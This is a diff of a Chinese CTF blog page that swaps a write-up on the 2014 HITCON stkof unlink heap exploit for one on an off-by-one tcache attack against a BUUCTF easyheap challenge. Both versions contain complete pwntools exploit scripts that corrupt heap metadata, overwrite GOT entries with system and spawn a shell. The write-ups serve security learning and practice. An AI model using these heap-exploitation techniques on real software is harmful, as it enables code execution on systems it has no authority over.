@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                ctfwiki-unlink—2014 HITCON stkof
+                                ubuntu18中的off-by-one
                             </h1>
                             
                                 <!--en-->
@@ -175,19 +175,21 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-06</a>
+                                Date: <a href="#">2020-09-18</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">4.2
+                                    href="#">3.0
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">785</a></span>
+                                    <span class="post-words">words:<a href="#">623</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
+                                <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">buuctf</a>
                                 
-                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
+                                <a href="https://l3mon629.github.io/tag/d85MadhBD/">tcache-attach</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">off-by-one</a>
                                 
                             </span>
                                         
@@ -199,201 +201,112 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>通过这个题目再来学习下unlink</p>
-<h2 id="逆向">逆向</h2>
-<p>main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能</p>
-<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
-{
-  int index; // eax
-  signed int v5; // [rsp+Ch] [rbp-74h]
-  char nptr; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
-
-  v7 = __readfsqword(0x28u);
-  alarm(0x78u);
-  while ( fgets(&amp;nptr, 10, stdin) )
-  {
-    index = atoi(&amp;nptr);
-    if ( index == 2 )
-    {
-      v5 = sub_4009E8();
-      goto LABEL_14;
-    }
-    if ( index &gt; 2 )
-    {
-      if ( index == 3 )
-      {
-        v5 = sub_400B07();
-        goto LABEL_14;
-      }
-      if ( index == 4 )
-      {
-        v5 = sub_400BA9();
-        goto LABEL_14;
-      }
-    }
-    else if ( index == 1 )
-    {
-      v5 = sub_400936();
-      goto LABEL_14;
-    }
-    v5 = -1;
-LABEL_14:
-    if ( v5 )
-      puts(&quot;FAIL&quot;);
-    else
-      puts(&quot;OK&quot;);
-    fflush(stdout);
-  }
-  return 0LL;
-}
-</code></pre>
-<p>add堆块功能：<br>
-其中heaparray在0x602140处</p>
-<pre><code class="language-c">signed __int64 sub_400936()
-{
-  __int64 size; // [rsp+0h] [rbp-80h]
-  char *mem_ptr; // [rsp+8h] [rbp-78h]
-  char s; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
-
-  v4 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  size = atoll(&amp;s);
-  mem_ptr = (char *)malloc(size);
-  if ( !mem_ptr )
-    return 0xFFFFFFFFLL;
-  ::s[++dword_602100] = mem_ptr;
-  printf(&quot;%d\n&quot;, (unsigned int)dword_602100, size);
-  return 0LL;
-}
-</code></pre>
-<p>free：<br>
-no UAF</p>
-<pre><code class="language-c">signed __int64 sub_400B07()
-{
-  unsigned int v1; // [rsp+Ch] [rbp-74h]
-  char s; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
-
-  v3 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  v1 = atol(&amp;s);
-  if ( v1 &gt; 0x100000 )
-    return 0xFFFFFFFFLL;
-  if ( !::s[v1] )
-    return 0xFFFFFFFFLL;
-  free(::s[v1]);
-  ::s[v1] = 0LL;
-  return 0LL;
-}
-</code></pre>
-<p>edit:可以任意修改堆块size，造成任意堆溢出</p>
-<pre><code class="language-c">signed __int64 sub_4009E8()
-{
-  signed __int64 result; // rax
-  int i; // eax
-  unsigned int index; // [rsp+8h] [rbp-88h]
-  __int64 size; // [rsp+10h] [rbp-80h]
-  char *ptr; // [rsp+18h] [rbp-78h]
-  char s; // [rsp+20h] [rbp-70h]
-  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
-
-  v6 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  index = atol(&amp;s);
-  if ( index &gt; 0x100000 )
-    return 0xFFFFFFFFLL;
-  if ( !::s[index] )
-    return 0xFFFFFFFFLL;
-  fgets(&amp;s, 16, stdin);
-  size = atoll(&amp;s);
-  ptr = ::s[index];
-  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )
-  {
-    ptr += i;
-    size -= i;
-  }
-  if ( size )
-    result = 0xFFFFFFFFLL;
-  else
-    result = 0LL;
-  return result;
-}
-</code></pre>
-<h2 id="io-缓冲区问题分析">IO 缓冲区问题分析</h2>
-<p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看<br>
-初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p>
-<p>别管我说的啥，调试就完了</p>
-<h2 id="exp">exp</h2>
-<p>思路：利用unlink修改heaparray[0][1][2]，看exp吧</p>
+                            <h2 id="逆向">逆向</h2>
+<blockquote>
+<p>main函数<br>
+<img src="https://l3mon629.github.io/post-images/1600427570851.png" alt="" loading="lazy"><br>
+add函数，可以发现我们只能创建0x18和0x38大小的chunk，而且程序会给我们创建一个chunk来管理我们的chunk<br>
+<img src="https://l3mon629.github.io/post-images/1600427603059.png" alt="" loading="lazy"><br>
+delete函数，并没有UAF漏洞<br>
+<img src="https://l3mon629.github.io/post-images/1600427619970.png" alt="" loading="lazy"><br>
+show函数，可以用来泄漏地址<br>
+<img src="https://l3mon629.github.io/post-images/1600427636303.png" alt="" loading="lazy"><br>
+edit函数，可以看到存在off-by-one漏洞<br>
+<img src="https://l3mon629.github.io/post-images/1600427658379.png" alt="" loading="lazy"></p>
+</blockquote>
+<blockquote>
+<p>利用思路<br>
+回顾一下ubuntu16.04中的利用思路：<br>
+malloc(3个chunk)<br>
+off by one溢出改size<br>
+free1，free2，进去unsorted bin，泄漏地址<br>
+malloc big chunk，修改重叠chunk的fd指针，结束。<br>
+在ubuntu18中引进了tcache机制，使得泄漏地址变得更为困难（因为要逃逸tcache bin）<br>
+思路大体相同，但是在调试过程中要更为细心。</p>
+</blockquote>
+<h2 id="流程和exp">流程和exp</h2>
+<p>我们先申请一个chunk来看一下内存分布<br>
+<img src="https://l3mon629.github.io/post-images/1600428711717.png" alt="" loading="lazy"></p>
+<p>可以看到管理chunk中有一个指针，我们想办法来控制它</p>
+<p>首先要想办法来泄漏地址，由于我们只能malloc两种size的chunk，我们只能构造出0x41的chunk作为big chunk，把一个管理chunk包含进去，然后free掉bigchunk，这个时候tcache bins里面有两个chunk，一个是0x40大小一个是0x20大小，我们这个时候malloc(0x38)大小的chunk，可以把0x20作为控制信息，0x40作为mem chunk，但是注意，我们之前的bigchunk恰好是管理chunk，也就是说我们拥有了向管理chunk内写入的能力。<br>
+我们可以写入elf.got['free']，然后show一下，泄漏出__libc_free，然后覆盖free为system，就能拿shell了</p>
+<p>exp:</p>
 <pre><code class="language-python">from pwn import *
+from LibcSearcher import *
 
-p = process('./stkof')
-elf = ELF('./stkof')
-libc = ELF('./libc.so.6')
+local = 1
 
-def add(size):
-	p.sendline('1')
-	p.sendline(str(size))
+if local == 1:
+	p = process('./npuctf_2020_easyheap')
+else:
+	p = remote('node3.buuoj.cn',26806)
 
-def edit(index,size,content):
-	p.sendline('2')
-	p.sendline(str(index))
-	p.sendline(str(size))
-	p.send(content)
+elf = ELF('./npuctf_2020_easyheap')
+libc = ELF('./libc-2.27.so')
 
-def delete(index):
-	p.sendline('3')
-	p.sendline(str(index))
+def dbg():
+	context.log_level = 'debug'
 
-add(0x10)	#chunk1：对抗缓冲区
-add(0x30)	#chunk2
-add(0x80)	#chunk3
-add(0x10)	#chunk4
+def add(size,content):
+	p.sendlineafter('Your choice :','1')
+	p.sendlineafter('Size of Heap(0x10 or 0x20 only) :',str(size))
+	p.sendafter('Content:',content)
 
-ptr = 0x602140
-fd = ptr + 0x10 - 0x18 
-bk = ptr + 0x10 - 0x10
+def edit(index,content):
+	p.sendlineafter('Your choice :','2')
+	p.sendlineafter('Index :',str(index))
+	p.sendafter('Content:',content)
 
-fake_chunk = p64(0)
-fake_chunk += p64(0x31)
-fake_chunk += p64(fd)
-fake_chunk += p64(bk)
-fake_chunk += p64(0) * 2
-fake_chunk += p64(0x30)
-fake_chunk += p64(0x90)
+def show(index):
+	p.sendlineafter('Your choice :','3')
+	p.sendlineafter('Index :',str(index))
 
-edit(2,len(fake_chunk),fake_chunk)
-delete(3)
+def free(index):
+	p.sendlineafter('Your choice :','4')
+	p.sendlineafter('Index :',str(index))
 
-print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;)
-payload = p64(0) 
-payload += p64(elf.got['free'])
-payload += p64(elf.got['puts'])
-payload += p64(elf.got['atoi'])
-edit(2,len(payload),payload)
+add(0x18,'a')	#chunk 0
+pause()
+add(0x18,'aaaaaaaa')	#chunk 1 
+add(0x18,'AAAAAAAA')	#chunk 2
 
-print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;)
-payload = p64(elf.plt['puts'])
-edit(0,8,payload)
+payload = b'/bin/sh;' + 0x10 * b'A' + b'\x41'
+edit(0,payload)
 
-delete(1)
+free(1)
 
-#context.log_level = 'debug'
-puts_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b'\x00'))
-print(&quot;puts addr ----&gt; &quot; + hex(puts_addr))
-print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;)
-libc_base = puts_addr - 0x67860
-print(&quot;libc  ---&gt;  &quot; + hex(libc_base))
+payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['free'])
+#payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['atoi'])
+add(0x38,payload)	#chunk 1
+#dbg()
+show(1)
+free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+print(&quot;[*] free address: &quot;,hex(free_addr))
 
-system_addr = libc_base + 0x3f550
-paylaod = p64(system_addr)
-edit(2,8,paylaod)
-p.sendline(&quot;sh&quot;)
+'''
+#libc_base = free_addr - 0x81540
+libc_base = free_addr - 0x35e40
+__free_hook = libc_base + 0x3b48e8
+system_addr = libc_base + 0x41af0
+
+print(&quot;[*] libc_base ---&gt; &quot;,hex(libc_base))
+#print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook))
+print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr))
+'''
+
+libc = LibcSearcher('free',free_addr)
+libc_base = free_addr - libc.dump('free')
+print(&quot;[*] libc_base : &quot;,hex(libc_base))
+system_addr = libc_base + libc.dump('system')
+print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr))
+
+payload = p64(system_addr)
+edit(1,payload)
+free(0)
 
 p.interactive()
 </code></pre>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1600429178576.png" alt="" loading="lazy"></figure>
 
                         </div>
                         
@@ -402,8 +315,7 @@ p.interactive()
 <li>
 <ul>
 <li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
-<li><a href="#io-%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">IO 缓冲区问题分析</a></li>
-<li><a href="#exp">exp</a></li>
+<li><a href="#%E6%B5%81%E7%A8%8B%E5%92%8Cexp">流程和exp</a></li>
 </ul>
 </li>
 </ul>
@@ -421,7 +333,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/">https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -436,9 +348,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=qzone&title=ctfwiki-unlink—2014 HITCON stkof&pics=https://l3mon629.github.io/images/avatar.png?v=1600429211371&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=weibo&title=ctfwiki-unlink—2014 HITCON stkof + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600429211371 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/&sharesource=qzone&title=ubuntu18中的off-by-one&pics=https://l3mon629.github.io/images/avatar.png?v=1600429211371&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/&sharesource=weibo&title=ubuntu18中的off-by-one + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600429211371 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -448,12 +360,16 @@ p.interactive()
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
-                                                heap
+                        <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">#
+                                                buuctf
                                                     </a>
                                                     
-                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
-                                                unlink
+                        <a href="https://l3mon629.github.io/tag/d85MadhBD/">#
+                                                tcache-attach
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">#
+                                                off-by-one
                                                     </a>
                                                     
                                                         
@@ -469,13 +385,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/">
-                                                                                            glibc源码学习
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">
-                                                                                                    unlink利用—hitcontraining_unlink
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/cxue-xi/">
+                                                                                                    C++学习
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
